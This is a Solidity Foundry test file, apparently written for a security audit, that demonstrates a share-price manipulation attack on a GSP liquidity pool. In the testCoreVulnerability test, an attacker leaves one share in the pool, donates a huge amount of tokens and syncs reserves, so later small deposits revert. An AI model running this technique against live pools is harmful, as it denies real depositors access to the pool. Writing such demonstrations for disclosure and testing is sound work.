// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import {Test, console} from "forge-std/Test.sol";
import {GSP} from "../../contracts/GasSavingPool/impl/GSP.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

/**
 * @title Mock ERC20 Token for testing
 * @dev Simple ERC20 implementation for testing purposes
 */
contract MockERC20 is IERC20, IERC20Metadata {
    string public override name;
    string public override symbol;
    uint8 public override decimals;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "INSUFFICIENT_BALANCE");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "INSUFFICIENT_BALANCE");
        require(allowance[from][msg.sender] >= value, "INSUFFICIENT_ALLOWANCE");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function mint(address to, uint256 value) external {
        totalSupply += value;
        balanceOf[to] += value;
        emit Transfer(address(0), to, value);
    }
}

/**
 * @title Exploit Test for GSPFunding Share Price Manipulation
 * @dev Demonstrates the vulnerability where an attacker can manipulate share price during initialization
 * to cause a denial-of-service for subsequent buyShares operations
 */
contract ExploitTest is Test {
    GSP public gsp;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;

    // Test addresses
    address public attacker = address(0x1);
    address public victim = address(0x2);
    address public maintainer = address(0x3);

    // Constants for the attack
    uint256 constant INITIAL_BASE_AMOUNT = 1001e18;  // 1001 base tokens
    uint256 constant INITIAL_QUOTE_AMOUNT = 1001e6;   // 1001 quote tokens (6 decimals)
    uint256 constant DUMP_SHARES = 1000e18;          // 1000 shares to dump
    uint256 constant DONATION_AMOUNT = 1000000e18;    // Very large donation to pump reserves
    uint256 constant VICTIM_BASE_AMOUNT = 100e18;     // Victim's base token amount (smaller)
    uint256 constant VICTIM_QUOTE_AMOUNT = 100e6;     // Victim's quote token amount (smaller)

    function setUp() public {
        // Deploy mock tokens with large but reasonable supply
        uint256 largeSupply = 1000000000e18; // 1 billion tokens
        baseToken = new MockERC20("Base Token", "BASE", 18, largeSupply);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 6, largeSupply);

        // Deploy GSP pool
        gsp = new GSP();

        // Initialize GSP with standard parameters
        gsp.init(
            maintainer,
            address(baseToken),
            address(quoteToken),
            0,                    // LP fee rate
            10000000000000,       // MT fee rate
            1000000,              // I (oracle price)
            500000000000000,      // K
            false                 // TWAP disabled
        );

        // Fund attacker and victim with tokens - ensure attacker has enough for all operations
        uint256 attackerBaseFunding = INITIAL_BASE_AMOUNT + DONATION_AMOUNT * 10;
        uint256 attackerQuoteFunding = INITIAL_QUOTE_AMOUNT + DONATION_AMOUNT * 10;

        baseToken.mint(attacker, attackerBaseFunding);
        quoteToken.mint(attacker, attackerQuoteFunding);
        baseToken.mint(victim, VICTIM_BASE_AMOUNT);
        quoteToken.mint(victim, VICTIM_QUOTE_AMOUNT);
    }

    
    /**
     * @notice Test that normal operation works without the attack
     * @dev This demonstrates that buyShares works normally when pool is not manipulated
     */
    function testNormalOperation() public {
        console.log("=== Testing normal operation without attack ===");

        vm.startPrank(victim);

        // Normal deposit amounts
        uint256 normalBase = 100e18;
        uint256 normalQuote = 100e6;

        baseToken.transfer(address(gsp), normalBase);
        quoteToken.transfer(address(gsp), normalQuote);

        // This should work fine
        (uint256 sharesMinted,,) = gsp.buyShares(victim);

        console.log("Normal shares minted:", sharesMinted);
        assertTrue(sharesMinted > 1000, "Normal operation should mint > 1000 shares");

        vm.stopPrank();
    }

    /**
     * @notice Test the core vulnerability with minimal setup
     * @dev Simplified test to demonstrate the exact mechanism
     */
    function testCoreVulnerability() public {
        console.log("=== Testing Core Vulnerability ===");

        // Step 1: Attacker initializes pool with minimal shares
        vm.startPrank(attacker);

        // Use smaller initial amounts to get exactly 1001 shares
        uint256 initBase = 1001e18;
        uint256 initQuote = 1001e6;

        // Ensure attacker has enough tokens
        baseToken.mint(attacker, initBase + 10000000e18);
        quoteToken.mint(attacker, initQuote + 10000000e18);

        baseToken.transfer(address(gsp), initBase);
        quoteToken.transfer(address(gsp), initQuote);

        (uint256 sharesMinted,,) = gsp.buyShares(attacker);
        console.log("Initial shares minted:", sharesMinted);

        // Step 2: Sell back almost all shares, keeping 1
        uint256 sellShares = sharesMinted - 1;
        gsp.sellShares(sellShares, attacker, 0, 0, "", block.timestamp + 1000);

        console.log("Remaining shares:", gsp.balanceOf(attacker));
        console.log("Total supply:", gsp.totalSupply());

        // Step 3: Donate huge amount to pump reserves
        uint256 hugeDonation = 10000000e18; // 10 million tokens
        baseToken.transfer(address(gsp), hugeDonation);
        quoteToken.transfer(address(gsp), hugeDonation);
        gsp.sync();

        console.log("Reserves after donation - Base:", gsp._BASE_RESERVE_(), "Quote:", gsp._QUOTE_RESERVE_());

        vm.stopPrank();

        // Step 4: Victim tries with small amount
        vm.startPrank(victim);

        uint256 victimBase = 100e18;  // Small amount
        uint256 victimQuote = 100e6;

        baseToken.transfer(address(gsp), victimBase);
        quoteToken.transfer(address(gsp), victimQuote);

        // Calculate what would happen
        uint256 baseInputRatio = (victimBase * 1e18) / gsp._BASE_RESERVE_();
        uint256 quoteInputRatio = (victimQuote * 1e18) / gsp._QUOTE_RESERVE_();
        uint256 mintRatio = baseInputRatio < quoteInputRatio ? baseInputRatio : quoteInputRatio;
        uint256 expectedShares = (gsp.totalSupply() * mintRatio) / 1e18;

        console.log("Base input ratio:", baseInputRatio);
        console.log("Quote input ratio:", quoteInputRatio);
        console.log("Mint ratio:", mintRatio);
        console.log("Expected shares:", expectedShares);
        console.log("Total supply:", gsp.totalSupply());

        // This should be less than 1000, causing the revert
        assertTrue(expectedShares < 1000, "Expected shares should be less than 1000");

        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gsp.buyShares(victim);

        vm.stopPrank();

        console.log("=== VULNERABILITY CONFIRMED ===");
    }
}